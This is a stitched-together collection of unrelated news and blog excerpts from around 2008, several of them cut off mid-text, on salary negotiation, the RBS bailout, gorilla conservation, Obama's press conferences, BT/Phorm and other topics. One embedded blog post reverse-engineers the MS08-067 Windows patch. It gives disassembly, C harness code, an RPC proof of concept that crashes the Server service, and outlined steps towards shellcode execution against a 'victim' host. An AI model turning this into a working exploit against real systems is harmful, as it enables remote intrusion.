" We think ( BizSpark ) is a fantastic program and are very pleased , " Ganju said .
Despite the tough economy , Microsoft has increased its investment in BizSpark to drive the program forward , Lewin said , because " This is our lifeblood , working with developers . "
It is as they desperately try to find shelter that they bump into each other or their surroundings , exploding the eggs inside them , she said .
Job interviewing is like art : it requires skill , dexterity , and the right tools and environment .
Make one wrong move and the result can be disastrous .
This is especially true when it comes to discussing salary requirements .
As a job - seeker , approaching a conversation with a prospective employer about salary requirements can be tricky .
How soon can you expect an employer to ask you about your salary requirements ?
Should you ever include salary requirements in a cover letter ?
How can you pick a salary that does n't aim too high or too low ?
To find sage answers to these and other basic questions about salary requirements , I tapped several career experts for their wisdom .
The Ins and Outs of Salary Requirements
Question :
When interviewing for a new job , what are some basic principles job - seekers should keep in mind about their salary requirements ?
Do You Know What You 're Worth ?
GET A FREE PAY REPORT
Answers : “ Salary requirements should be based on the market value for a particular skill set or job … not on the job seeker ’s needs or desires , ” says Barbara Safani , president of New York - based Career Solvers , a career - management firm .
You should be flexible , too , knowing much can transpire during the time when a job is first posted and when it ’s filled , she explains .
“ If a position seems perfect for you , but the salary is lower than you had hoped for , go through the interview process and sell your value to the hiring manager throughout .
Once a hiring manager decides that you are the right candidate , they will be more willing to negotiate salary . ”
Dr. Rachelle J. Canter , author of Make the Right Career Move : 28 Critical Insights and Strategies to Land Your Dream Job , urges job - seekers to focus not just on salary requirements , but on opportunity .
To that end , she advises asking yourself some key questions , such as :
Will this job provide you with crucial experiences , skills , and accomplishments that you need to attain your dream job eventually ?
Will it fill in critical gaps in your industry or job experience ?
Will it give you visibility with an audience you previously were unknown to ?
Question : Should job - seekers mention salary requirements in cover letters ?
Answer : “ No no no -–salary is a way to screen you out ( too high or too low ) , and you want a chance to look over a prospective employer before being eliminated , ” Canter explains .
Question : Should job - seekers give an exact salary figure , or a salary range ?
Answers :
If you have to , give a range for your salary requirements , Canter says , but try to stay focused on whether the job is the right fit .
” Once an employer falls in love with you , your negotiating power increases exponentially , ” she says .
Safani also recommends a range instead of a specific number , because it gives you wiggle room once you get to the salary negotiation stage .
Question :
How soon during the interviewing process can a job - seeker expect the salary requirement conversation to come up ?
Answer :
It could arise as soon as the first interview , so you need to know your competitive market value before you start interviewing , Safani says .
You can try deferring the conversation by saying you ’d like to learn more about the job , so you can gauge whether it ’s a good match before rolling out your salary requirements .
If an employer presses you for a “ ballpark figure , ” ask for the salary range of the job , Safani says ; if they wo n’t divulge it , say based on your research , you ’ve found that pay for such positions is “ between X and Y , ” and ask if that ’s consistent with their range .
Question :
How do you determine what your salary requirements should be , so you ’re not aiming too high or low ?
Answer : “ Job seekers should benchmark their market value by talking with recruiters and colleagues , researching salary ranges for comparable positions on the job boards , reviewing salary information available through professional associations , and of course reviewing information on PayScale , ” according to Safani .
Questions :
What if a prospective employer asks to verify your current salary with your current employer ?
What if this jeopardizes your current position ?
Answer : “ Until there is an offer on the table , this question should not come up .
Once an offer is made , this is considered fair game as part of the due diligence process for some employers , ” Safani says .
“ Job seekers can politely explain that if an offer is extended , they would be willing to have their salary information verified . ”

That is , until you realize that they 're completely overrun by inaccuracies .
It did n't take long for the Kotaku commenters to rip apart the list , with one reader finding flaws with data on each platform .
So we 're left with one question :
If Activision does n't understand the compatibility issues regarding their own games and hardware , how are we as consumers EVER going to get it ?

Check RBS share price
The government is to own 57.9 % of Royal Bank of Scotland after shareholders bought only a tiny proportion of the new shares being offered by the bank .
The small take - up had been expected as the offer price of 65.5 p was about 10 p higher than the price at which the shares were trading .
The share issue by RBS , which owns NatWest , was part of the government 's plan to recapitalise banks .
The government will pay about £ 15 bn for the majority stake in the bank .
It will also buy £ 5 bn of preference shares in the bank .
Whether they like it or not , most banks and bankers are destined to lead a quieter , duller life for many years
Robert Peston , BBC business editor
Read Robert Peston 's blog Existing shareholders agreed to buy almost 56 million shares , which represents just 0.24 % of the new shares on offer , at a cost of £ 36.7 m , making an immediate paper loss of £ 5.6 m .
The remainder of the shares are being purchased by the government , which means that taxpayers have made an immediate paper loss of £ 2.4bn based on Thursday 's closing share price .
" We regret that existing shareholders did not take up their pre-emptive rights but understand that market sentiment toward the banking sector made this uneconomic in the short term , " said RBS Chief Executive Stephen Hester .
" There remain substantial uncertainties and challenges outside our control but for our part the job is underway . "
Strings attached RBS shareholders voted to take the government money at a meeting last week .
There will be strings attached , with the bank losing freedom in areas such as executive pay and dividend policy .
RBS also had to agree to return to " normal " lending practices , and last week it announced that it would guarantee overdraft rates and contracts for its business customers for at least a year .
The government 's shares will be held by a company called UK Financial Investments Ltd , which is supposed to maximise value for taxpayers and prevent politicians making business decisions about banks .
Its chair will be Philip Hampton , chairman of Sainsbury 's and former finance director of Lloyds TSB .
Lending problems RBS is one of the many banks that has been hit by its exposure to debt based on US sub - prime loans .
It has also struggled with the collapse in inter - bank lending as the whole industry worried about which of their peers they could afford to lend to .
Critics say that RBS paid too much to buy ABN Amro last year .
It led a consortium that paid 71bn euros ( $ 91bn ; £ 61 bn ) for the Dutch bank in October 2007 .

Many of us have adopted small , easy habits to help make our lives a little more environmentally friendly .
Maybe you 've given up bottl­ed water , switched to eco-friendly household cleaners , started recycling or switched the lightbulbs in your home to the more energy - efficient compact fluorescent alternative .
Each of these decisions is a good way to help combat global warming .
But how do you choose which green living changes are right for you ?
And how can you be sure your choices are right for the planet ?
­ It can be hard to sort out the facts about leading an eco- friendly lifestyle , and there are many shades of green .
What you think you know is true may turn out to be more turquoise than shamrock .
The big offenders in the global warming crisis are in the news all the time -- coal - burning power plants and high levels of fossil fuel consumption , greenhouse gas emissions and air pollution , the number of cars on the world 's roads .
But let 's consider the not - so - obvious offenders .
Trees , for example .
Good for the planet , right ?
In many respects , yes , but we bet you did n't know that planting trees to offset atmospheric carbon dioxide ( CO­ 2 ­ ) might actually cause a net warming effect .
Yes , you read that correctly : warming .

The Wildlife Conservation Society ( WCS ) and the government of Cameroon have just created a new national park to preserve habitat for the Cross River gorilla , the world ’s most endangered great ape .
Besides the Cross River gorillas , the 261 square mile Takamanda National Park will also protect populations of forest elephants , chimpanzees , and a rare primate and close relative of the mandrill , the drill .
Takamanda also forms part of a trans - boundary protected area with Cross River National Park in Nigeria , safeguarding about 115 gorillas ( a third of the Cross River gorilla population ) .
Trans - boundary protected areas allow species to roam freely between nations .
“ The Government of Cameroon is to be commended for taking this step in saving the Cross River gorilla for future generations .
By forming this national park , Cameroon sends a powerful message about the importance of conservation . ” – Dr. Steven E. Sanderson , President and CEO of WCS
The Cross River gorilla , the rarest of the four gorilla subspecies , is threatened by habitat destruction caused by farming and road - building , as well as hunting by bushmeat hunters .
The other subspecies are the western lowland gorillas , eastern lowland or “ Grauer ’s ” gorillas , and mountain gorillas .
WCS is the only conservation group working to safeguard the four subspecies , all classified as “ critically endangered ” or “ endangered ” by the IUCN Red List .
Funding for the creation of Takamanda National Park comes from a partnership between the Cameroon Ministry of Forestry and Wildlife and the German Development Bank as part of a 5 - year funding program that protects key conservation areas through collaboration with southwest Cameroon communities .
The initiative is also supported by the World Wildlife Fund ( WWF ) , the German Technical Cooperation ( GTZ ) , and the German Development Service ( DED ) .
“ This represents a huge step in ensuring a future for the world ’s rarest great ape .
Making this former forest reserve a national park will effectively protect these gorillas and will continue the conservation partnership between Cameroon and Nigeria . ” – Dr. James Deutsch , Director of WCS - Africa
The creation of Takamanda represents years of work by WCS and the Cameroon Ministry of Forestry and Wildlife , including baseline surveys of gorillas and other large mammals , agreements with local communities , recommendations for upgrading the reserve to park status , and establishment of trans - boundary activities with the Okwangwo Division of Cross River National Park in Nigeria .

Yeah , yeah , yeah , there 's Deery Lou on the left and Strummer the pup with a homemade hat on the right .

LOOK AT THAT RUG !
It 's so awesome .
Just kiddin ' , the rug is great , but let 's give it up for Deery Lou and Strummer the Pup .
The peer groups teenage girls identify with determine how they decide to control their own figure .
So reports a new study ( 1 ) by Dr. Eleanor Mackey from the Children 's National Medical Center in Washington DC , and her colleague Dr. Annette La Greca from the University of Miami .
Also influencing weight control behavior is girls ' own definition of normal body weight and their perception of what others consider normal body weight .
These results have just been published online in the Journal of Youth and Adolescence , a Springer publication .
Dangerous weight control practices such as excessive dieting and bulimic tendencies often begin in adolescence and can have serious long - term health implications .
Although it is clear that peers can have a major effect on adolescent girls ' weight control strategies , exactly how peers exert their influence is to date not well understood .
The researchers aimed to clarify how identifying with a particular peer group influences whether or not girls worry about their weight and how they decide to control it .
The authors tested 236 girls aged between 13 to 18 years old , who completed surveys looking at which peer groups they most identified with , their own concerns about body weight , their perception of their peers ' weight concerns and their own weight control behaviors .
The researchers found that there is a complex relationship between peer group affiliation and girls ' weight control behavior .
In particular , which group girls identified with was often related to how they controlled their weight .
More specifically , girls identifying with athletic peers ( ' Jocks ' ) were less concerned about their own weight and seemed less likely to be trying to control their weight .
Girls identifying with non-conformist peers ( ' Alternatives ' ) were more concerned about their weight and appearance and more likely to be actively trying to lose weight .
The girls who identified with those who skip school and often get into trouble ( ' Burnouts ' ) believed their peers valued thinness and dieting .
Finally , girls who did not belong to any particular peer group were the most likely to use slimming strategies .
According to the authors , this study shows that girls ' own attitudes and their perceptions of peers ' weight and appearance norms are pathways through which peer crowd identification may influence weight control behaviors .
Understanding these pathways has implications for prevention and intervention programs in both schools and primary care settings .
The authors suggest that " health care providers and school personnel might ask adolescent girls about their peer crowd affiliations in order to help identify adolescents with the highest levels of risky health behaviors ... Girls ' body and weight dissatisfaction is also likely to be an important component of weight control interventions . "

In the 22 days since winning the White House , President - elect Barack Obama has taken 22 questions from reporters and has done two sit - down television interviews .
The Democrat held his fourth press conference since Nov. 4 in Chicago Wednesday morning — his third in as many days — an unprecedented bit of access for reporters who have grown accustomed to President Bush ’s infrequent moments taking questions and already surpassing the last four presidents - in - waiting .
Mr. Obama has beat his four predecessors in number of post-election , pre-inauguration press conferences , and is inheriting a troubled nation .
With one Cabinet post officially named , he is working at a faster clip than former President Bill Clinton .
In 2000 , Mr. Bush gave one press conference as president - elect , and not until Dec. 19 , because the results of his victory over Vice President Al Gore were so long in dispute .
As president - elect in 1992 , Mr. Clinton held three pre-inauguration press conferences .
George H.W. Bush held one press conference as president - elect , on Nov. 11 , 1988 .
Ronald Reagan also held one press conference before his 1981 inauguration .
He called the major press conference to trot out his Cabinet nominees , but did n’t show up himself .
In his four press conferences , Mr. Obama has called on 22 reporters , including Lynn Sweet from his hometown paper , the Chicago Sun-Times , who asked four questions and he answered each one .
He took six questions Monday , just four questions Tuesday and three on Wednesday .
Some are grumbling that Obama transition aides preselected the reporters who would be allowed questions .
He ’ll likely get another crack at it early next week when he names Sen.
Hillary Rodham Clinton as secretary of state and members of his national security team .
Mr. Obama frequently has made big announcements in front of a video camera instead of speaking to members of the press .
His decision to become the first candidate to decline public financing was communicated first to supporters in a Web video .
Obama aides spoke to reporters about the news , but the candidate did not .
This is the most access reporters have had to Mr. Obama in weeks , as he repeatedly declined to answer questions shouted at him on the tarmac and did not hold press conferences in the final stretch of the campaign .
Mike Madden , Washington correspondent for Salon.com , said it is not helpful the Obama transition makes its major announcements from Chicago instead of Washington because that makes it more difficult for news organizations who spent most of their travel budgets covering the campaign .
“ I ’d be going to the press conferences and trying to ask questions , but instead I ’m watching on TV because it ’s not worth the airfare just to maybe get a question in , ” he said .
Mr. Obama so far has fielded two questions each from the Associated Press , NBC , CNN and Reuters news agency .
He also has taken one question each from ABC , CBS , Bloomberg News , McClatchy , the Chicago ABC affiliate , Chicago Tribune , Chicago Sun-Times , New York Times , The Washington Post , Wall Street Journal , Los Angeles Times , New York Daily News , National Public Radio and USA Today .
He has called on all the networks except Fox News .
At each press conference , Mr. Obama had a pre-written list of reporters at his podium , pausing to look down at it and read the name before looking up to find the reporter in the room .
During the campaign , Mr. Obama initially was more open with reporters , regularly taking questions .
But there were long stretches when he avoided the press .
During a particularly heated week before the Texas and Ohio contests , Mr. Obama held a press conference to discuss his relationship with real estate developer Tony Rezko that did not go well , as several reporters shouted at him once he walked away from the podium .
Rezko was convicted on several counts of fraud and bribery earlier this year .
“ Guys , I mean come on .
I just answered like eight questions , ” he said as he left the room , noting he was running behind schedule .
About two months later , he scolded a reporter for asking a question about former President Carter ’s meeting with Hamas while he was doing a photo opportunity at a diner , saying “ Why is it that ca n’t I just eat my waffle ? ”
As president , Mr. Bush has held 49 solo press conferences , though his last was more than four months ago .
He averages 12 questions but took 21 , including follow - ups , at his most recent July 15 time on the podium .
Mr. Clinton held 62 solo press conferences , said Martha Kumar , a professor of political science at Towson University and a recognized expert on this at the White House .
Mr. Bush has held 155 joint press conferences with foreign leaders , while Mr. Clinton held 131 total with foreign leaders .

The Crown Prosecution Service ( CPS ) is gathering evidence on BT 's covert trials of Phorm 's ISP - level adware system to help it judge whether it is in the public interest to allow a private prosecution for breach of wiretapping laws .
CPS lawyers have asked to see the file handed to City of London police in summer .
After interviewing BT executives in September this year , the financial district 's force declined to bring charges .
It said that the tens of thousands of customers whose communications were hijacked and profiled during two tests in 2006 and 2007 , which were revealed by The Register , had given implicit consent .
Frustrated campaigner Alex Hanff then wrote to the CPS for leave to bring a private prosecution under the Regulation of Investigatory Powers Act 2000 .
A CPS spokeswoman confirmed on Wednesday that the Complex Casework Centre is working on the case .
The file handed to police included BT 's internal technical report from 2006 , which we obtained earlier this year .
It describes the the first trial as " stealth " and says customers were not told their wire was being tapped " as one of the aims of the validation was not to affect their experience " .
The CPS will determine whether there is sufficient evidence the secret testing was against the law and whether it would be in the public interest to bring a case to court .
The file will then pass to the Director of Public Prosecutions Keir Starmer QC , who will have final say .
If he gives consent , the prosecution will be brought by CPS lawyers , despite being a " private " prosecution .
Such trials are very rare .
The CPS spokeswoman was unable to estimate how long the process will take , but several months is not unheard of .
She said it was likely deliberations would again focus on the question of whether BT and Phorm had any consent to intercept traffic .
BT has always maintained it took legal advice that the trials were legal and always declined to produce that advice or give any details of its basis .
Meanwhile , the European Commission is considering the Department for Business , Enterprise and Regulatory Reform 's response to its second letter asking for an explanation of why no action has been over the trial .
A Brussels spokeswoman said the UK responded to the October 6 letter on November 13 .
The second EU letter contained " detailed questions on how the UK authorities have protected the privacy of UK citizens with regard to Phorm in the past , and how they intend to do so in the future , " she said .
" The Commission is currently analysing the response . "
If the Commission believes authorities failed to enforce European privacy directives it could bring a case against the UK at the European Court of Justice in Luxembourg . ®

A pilot study of a handful of San Francisco Visitacion Valley Middle School students exposed to pervasive community violence had shown the effectiveness of the one - on - one treatment .
With his initial funding used up , the Stanford University researcher needed more money to document the success .
Now he 'll get the chance .
An anonymous donor has stepped forward to fund a three - year full trial that will include treating 50 children suffering from PTSD - preferably in San Francisco , Carrion said .
The donation will be funneled through the Lucile Packard Children 's Hospital Foundation .
The amount and source were undisclosed .
" I 'm so happy because we 've been waiting for so long to do it , " Carrion said of the study .
" After this study , I will be able to say this works and give it to the people and train them how to use it . "
A year ago , The Chronicle reported on Carrion 's work in San Francisco and the devastating effects of PTSD on children as well as their inability to thrive in school .
PTSD is pervasive in violent communities , with a third of children living in those neighborhoods suffering from the mental disorder , according to the U.S. Department of Veteran Affairs and leading child trauma experts .
Children in communities such as Bayview - Hunters Point and Visitacion Valley are frequently exposed to gunfire , shootings , stabbings and other gang - or drug - related violence .
The Chronicle 's stories drew attention to Carrion 's need for funding to scientifically document his treatment .
Carrion 's method allows treatment providers to follow an easy - to - use manual that takes a child through a step - by - step program to address the cause and symptoms of PTSD in school - age children .
The one - on - one treatment includes about 17 hourlong sessions .
The new funding will enable him to bring in a trained team counselors to treat 25 children , with another 25 in a control group .
When the first group of children is finished , the second group will also receive treatment , Carrion said .
He wants to continue the research in San Francisco schools - where he conducted his pilot study .
Visitacion Valley Middle School Principal Jim Dierke said he'd be thrilled to have Carrion 's team back .
" That 's really great news , " he said , adding he'd be raising his hand to volunteer his school as a trial site .
" I 'll have both hands raised . "
Dierke sees the symptoms of PTSD almost daily - the violent and seemingly inexplicable outbursts , the inability to pay attention and the emotional withdrawal , among others .
" It 's showing up all over the place , " Dierke said .
Despite the lack of funding , Carrion has trained San Francisco district teachers and staff this year about the symptoms and effects of PTSD .
He 's now approached school district and community leaders to find out if they 're interested in having him return to treat the children at district schools .
" Some school systems are a good setting to ( treat ) a lot of the kids that experience that community violence , " he said .
" This looks like the ideal place for it to be done . "

reversing the ms08-067 patch …
We are gonna jump right in here :
First , let ’s download patches .
MS has supplied patches for 2 K .
Since 2 K is the older , less featureful of any of the operating systems , we should download those patches in order to gain insight into the vulnerability .
First , I grabbed the patch from http://www.microsoft.com/technet/security/bulletin/ms08-067.mspx.
I noted that it “ replaced ” the patch from ms06-040 …
So I downloaded MS06 - 040.mspx as well .
Extracting these patches can be done with , for example , “ Windows2000 - KB921883-x86-ENU.exe / extract : wherever ” .
In either case only netapi32.dll was patched – thank heavens !
Makes diffing easier .
Next I had to diff these patches .
I ’ve only done this once before , and I do n’t have any of my old tools .
The other Stephen told me about eEye ’s binary diffing suite , which I downloaded and installed ( with some dumb registry hacks to get it running under IDA 5.2 ) .
Fortunately DarunGrim ( the eEye differ ) is super - easy to use .
After running AnalIDA on both netapi32 ’s and exporting to sqllite , I had the following output from DarunGrim ( I clicked on “ Match Rate ” to get the diffs at the top ) :
On the left is netapi32.dll for 2K SP4 MS06-040 , and on the right is netapi32.dll from the latest MS08 - 067 2K SP4 patch .
So some unnamed subroutine as well as NetpManageIPCConnect .
Well I ’ll spare you the details about NetpManagerIPCConnect and just give an overview : it ’s called by NetJoinDomain and has nothing to do with the current vulnerability .
Or does it !
Maybe it ’s just a free security update for 2 K , I dunno .
Anyway that unnamed function is what ’s interesting .
Take a look at “ Unidentified Subroutines ” :
Hmm … StringCopyWorkerW is what MS uses whenever they have to start cleaning up their old fugly code .
Well looking at “ sub_7CDDB293 ” ( patched ) we have :
And in the old ( less patched ) function we have :
At first this kind of stuff gets you excited about unbounded stack copies , until you look at the function a little .
First off , the function takes one argument :
And there are no local buffers .
Huh … if you look at it a bit longer , you ’ll see the function copies FROM the “ pszDest ” buffer TO the “ pszDest ” buffer .
This is not the stuff strcpy overflows are made of , since the destination buffer is by definition at least as large as the source buffer .
So I discounted a straight up overflow and figured it must be an indexing error of some kind .
If you bring up MS06 - 040 for 2K SP4 netapi32.dll in IDA and look around , you can match up your flowgraph with the one I show here :
What tipped me off was :
.text:7CDDB318 014 89 6C 24 10 mov [ esp+14h+var_4 ] , ebp
.text:7CDDB31C 014 8B F5 mov esi , ebp
.text:7CDDB31E 014 83 C5 FE add ebp , -2
.text:7CDDB321 014 55 push ebp
.text:7CDDB322 018 57 push edi
.text:7CDDB323 01C E8 5C 00 00 00 call sub_7CDDB384
.text:7CDDB328 014 8B E8 mov ebp , eax ; ASS
That “ add ebp , - 2 ” could cause ebp to point before the start of our buffer , if ebp was initialized to point to the start of the buffer .
Moreover , if you look at “ sub_7CDDB384 ” , you ’ll see it scans backwards for a “ \ ” ( backslash ) character .
So if ebp did point prior to the buffer start , sub_7CDDB23D would make it point even further down the stack .
A subsequent wcscpy ( in the “ peach ” box in the graph above ) could then corrupt variables farther down the callstack ( like , say , EIP ) .
However , this section of code wo n’t be called until ebp is non-zero , which occurs in the “ green ” marked box , which must be pre-ceded by edx being initialized in the “ yellow ” box .
Rather than completely untangle the mess of functionality exposed in this disassembly , I wanted to run the function a little and see what kind of inputs correspond to what outputs .
I did this by taking the offset between sub_7CDDB23D and the load address of NETAPI32.DLL , and then I wrote this C program :
#include < windows .h>
#include < stdio.h >
int wmain ( int argc , wchar_t ** argv )
{
HMODULE netapi32 = LoadLibrary W ( argv [ 1 ] ) ;
void ( __stdcall * foo ) ( PWCHAR ) ;
WCHAR buf [ 4096 ] ;
*( PVOID * ) &foo = ( PVOID ) ((( PUCHAR ) netapi32 ) + 0x1b23d ) ;
// __asm { int 3 }
wcscpy ( buf , argv [ 2 ] ) ;
foo( buf ) ;
wprintf ( L ” %s
” , buf ) ;
}
Now I could basically just call the function on the command line with different combinations of characters and see what happened :
So basically it strips out preceding directory entries with each “ \..\ ” .
No doubt it does this by finding where a “ \..\ ” is , backing up to the backslash that starts before it , and copying the string down .
But what happens when there are are n’t any more prior directory entries ….
So it scanned backwards until it busted the stack ( as if there had been infinite recursion or it had allocated too much memory with alloca ) .
Probably cuz there was n’t any “ 0x5 c ” ( “ \ ” ) on the stack .
Well maybe in the RPC service there will be …
For that , get a call graph :
Looks complicated , but NetpwPathCanonicalize is an export , and SRVSVC.DLL imports it …
Wow , was n’t this exact function patched in MS06-040 ?
Microsoft sure has egg on their face .
Well , I did n’t have any packet generators with me and I do n’t know how to use metasploit , so I used Tenable ’s awesome mIDA plugin to rip out an IDL from SRVSVC :
mIDA never organizes its structs and unions correctly , so I had to fiddle with the resulting .IDL file , but that only took 5 - 10 minutes .
The next thing to do was put a harness together to call the NetprPathCanonicalize function in C/C ++:
#include < windows .h>
#include “ srvsvc. h ”
#include < stdio.h >
extern “ C ” PVOID __stdcall MIDL_user_allocate ( size_t s ) { return malloc(s ) ; }
extern “ C ” VOID __stdcall MIDL_user_free ( PVOID p ) { free( p ) ; }
int main ( int argc , char ** argv )
{
RPC_STATUS status ;
unsigned char * strBind = 0 ;
handle_t handle ;
status = RpcStringBindingComposeA(0 , // object uuid
( RPC_CSTR ) ” ncacn_np ” , // protseq
( RPC_CSTR ) argv [ 1 ] , // net addr
( RPC_CSTR ) argv [ 2 ] , // endpoint
0 ,
& strBind ) ;
if ( status ) { printf ( “ % d
” , status ) ; return status ; }
printf ( “ %s
” , strBind ) ;
status = RpcBindingFromStringBinding ( strBind , &handle ) ;
if ( status ) { printf ( “ % d
” , status ) ; return status ; }
RpcTryExcept {
unsigned char x [ 1000 ] ;
long q = 1 ;
_NetprPathCanonicalize ( handle , L” AAA ” , L”.\\\\x\\..\\..\\xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ” , x , 1000 , L ” ” , &q , 1 ) ;
} RpcExcept( EXCEPTION_EXECUTE_HANDLER ) {
unsigned long code = RpcExceptionCode ( ) ;
printf ( “ WAHAHAH %d %08x
” , code , code ) ;
} RpcEndExcept
printf ( “ hi
” ) ;
}
The MIDL_user_allocate / free functions are because MIDL.EXE wo n’t generate them for you but they end up in the client stubs .
I had to fiddle a little with the parameters in NetprPathCanonicalize to pass all the various checks and functions to get my evil data from NetprPathCanonicalize , through to NetpwPathCanonicalize and to the vulnerable “ sub_ … ” routine , but as you can see there is n’t much too it .
In order to get a real exploit out of this , we need to :
Prime our RPC service with additional data to ensure that a “ \ ” ( backslash ) will occur somewhere in an older portion of the callstack , so that ebp wo n’t point too far down the stack before the wcscpy
Dump a jmp esp somewhere into that mess of “ x ” s
Get valid Unicode shellcode ( which is n’t hard ) and put it in the “ x ” s .
You ’ve got almost 1000 bytes to work with , that should be more than enough for about anything .
I did n’t handle any authentication or anything in this dumb example , so you use it by :
net use \\victim\ipc$ / user : ” ” “ ” ( or valid creds , depending … )
die.exe \\victim \pipe\srvsvc
Oh just a dumb addendum to this post : you can get the PoC which remotely accesses this vuln off milw0rm : http://www.milw0rm.com/exploits/6824 and http://milw0rm.com/sploits/2008-ms08-067.zip.
This wo n’t get you execution since I ’m not in the habit of releasing toys for k1dd13s but , like the patch itself , it should be enough for anyone moderately skilled to get reliable EIP , it just needs a little futzing here and there .
Also , in fairness to Microsoft ’s fuzzers , although it is trivially easy to bust the unnamed “ sub_7CDDB23D ” that is internal to NETAPI32.DLL , actually accessing this function in a way that will remotely trigger the vulnerability is a bit trickier .
Once someone ’s pointed it out to you , you ’ll smack your forehead and wonder how you could ’ve missed it ( I have been smacking my forehead now for 2 days straight ) ; but it does actually require the alignment of several parameters in juuust the right way .
Anyone who ’s ever tried fuzzing something will know that for every parameter you can fuzz “ correctly ” ( i.e. , exploitably ) , there is probably a few thousand ( more often , billion ) ways to fuzz that parameter “ incorrectly ” ( i.e. , safely ) .
Multiply that by the 7 or so arguments required by NetprPathCanonicalize and even “ simple ” stuff like this can slip through the cracks .
*** more files and such to come ( idb , analida , etc. ) ***
Also , why is it that when you start googling for random stuff while you are reversing you always get hits for Chinese sites ? 😉
Also , we know Kostya Kortchinsky at Immuity beat us to this …and teased us about it …
The $ 1.7 - billion HiPER facility - High Power laser Energy Research - will kick off with a party this monday .
Yes , the project that will hopefully give us a way to produce limitless clean energy and save humanity from self - destruction ( or pull out an LHC and destroy half the planet ) , starts up with a hydrogen pellet and alcoholic cocktails , which , if you ask me , is the perfect way to begin saving the planet .
Here is how it works :
Advertisement
• HiPER is being designed to demonstrate the feasibility of laser driven fusion as a future energy source .
It will also enable the investigation of the science of truly extreme conditions – accessing regimes which cannot be produced elsewhere on Earth ( temperatures of hundreds of millions of degrees , billion atmosphere pressures , and enormous electric and magnetic fields ) .
• HiPER will require major developments in technology , building on the highly successful European capability in this area .
In particular , the PETAL laser , located in the Aquitaine region of France , will be a fore - runner to the HiPER facility to address physics and technology issues of strategic relevance for HiPER

Hopefully it will work out and we all would be able to party and have canapes and maki rolls to celebrate we can send oil to hell .

Despite the inclement weather , the Juneau Mudflats team has good things to report !
I got two sets of great photos from Mudflatters Doug , and Judy .
And Sandy Beach recounts the event :
I just got back from a very cold , very wet , very windy , but VERY enthusiastic anti-Palin rally .
Unlike last weekend , there were plenty of rolling news cameras , microphones , and reporters with little weather - proof notebooks so maybe we ’ll get some press !
The crowd gathered in front of the Capitol steps , which is right downtown , around the corner from the unoccupied Governor ’s Mansion .
State employees were encouraged to come in disguise due to fear of reprisals by the Palin administration , a chilling thought .
Speakers included fishermen , two pediatricians ( including one former head of Alaska Public Health ) , a former state Game Board rep , college student for gay / lesbian rights who ’s about to vote for the first time , two Alaska Native veterans , and someone who read an encouraging letter from Juneau state representative Beth Kertulla .
To wrap it up , one of Juneau ’s favorite singers , Vicki Van Fleet , belted the following , sung to the tune of Janis Joplin ’s Mercedes Benz ( lyrics by Sally O of Homer , Alaska ) :
Oh Lord wo n’t you make me the Vice President
McCain ’s just too soft on the environment
Being mayor of Wasilla was really quite hard
Now I ’m Commander–in - Chief of the National Guard
Oh Lord I ’m awaiting a heavenly sign
that with my lack of credentials the VP spot is mine !
Forgive my blind ambition and the lies that I have tossed
I must get to DC no matter the cost !!!!
Oh Lord wo n’t you give me a PR campaign
I ’m cuter and younger than old John McCain
My sister ’s ex-husband is my only stain
I ’m no Tina Fey but I do gotta brain
Oh Lord wo n’t you make me the Vice President
McCain ’s just too soft on the environment
Being mayor of Wasilla was my playing card
and being Vice President ca n’t be all that hard
Oh Lord wo n’t you make me the vice - presi – dent !

The U.S. Senate today passed by unanimous consent a bill that will extend unemployment benefits to jobless Americans by up to 13 weeks .
The legislation had passed the House of Representatives in October by a 368 to 28 vote .
This comes after the Labor Department reported today that claims for unemployment benefits jumped last week to the highest level since 1992 and George W. Bush announced this afternoon that he will sign the bill as soon as it reaches his desk .
“ Because of the tight job market , the president believes it would be appropriate to further extend unemployment benefits , and he would sign the legislation , ” said White House Spokeswoman Dana Perino .
Senator Ted Kennedy ( D - MA ) , Chairman of the Senate Health , Education , Labor and Pensions Committee and a guy who has always been on the right side of working families , seemed to consider this a good welcome - back present as he returned to work in the Senate after being diagnosed with cancer .
“ The Senate was right to act now to provide greater assistance for Americans who ca n’t find work , " said Kennedy .
" Today ’s action is a vital step in repairing the tattered safety net for the millions of families struggling during these harsh economic times .
But there is still much to be done , and I look forward to working with our new President and the new Congress early next year to do all we can to heal our stricken economy .
” Good news all around and an excellent thing to be bipartisan about right before the holidays .
Elwyn Tinklenberg is living the long - shot candidate ’s political dream .
There were n’t enough chairs for the volunteers crammed inside the four - room campaign office Wednesday morning .
Every time aides hit “ refresh ” on their computers , hundreds more online donations appeared .
Downstairs , the postal carrier spent 10 minutes trying to cram a two - foot stack of envelopes stuffed with checks into the mail slot .
“ It ’s been raining money , ” said Beth DeZiel , 39 , the campaign ’s dazed deputy finance director .
“ There ’s so much , we can barely keep up .
It ’s unbelievable . ”
But this unsolicited good fortune -- $ 1.3 million since Friday -- is n’t based on anything the Democratic former mayor and grandfather of seven did .
It ’s all because of something his rival , Minnesota Rep. Michele Bachmann , said .
Advertisement
On Friday afternoon , Bachmann appeared on MSNBC ’s “ Hardball with Chris Matthews ” and made what has been dubbed the million - dollar mistake : Bachmann , 52 , alleged that presidential candidate Barack Obama may hold “ anti-American ” views , and proposed a media investigation into “ the views of the people in Congress [ to ] find out :
Are they pro-America or anti-America ? ”
While Sen. Obama ’s presidential bid has transformed the way campaigns use the Internet to reach volunteers and donors , the technology has also become a way for the public to instantly react -- even to races in which they ca n’t vote .
Those quick reactions , often in the form of donations , can influence the outcome of a campaign , said Julie Barko Germany , director of the Institute for Politics , Democracy & the Internet at George Washington University ’s Graduate School of Political Management .
Barko Germany said “ the Internet can be an amplifier , ” enabling viewers to react instantly to something that incites strong support or fury .

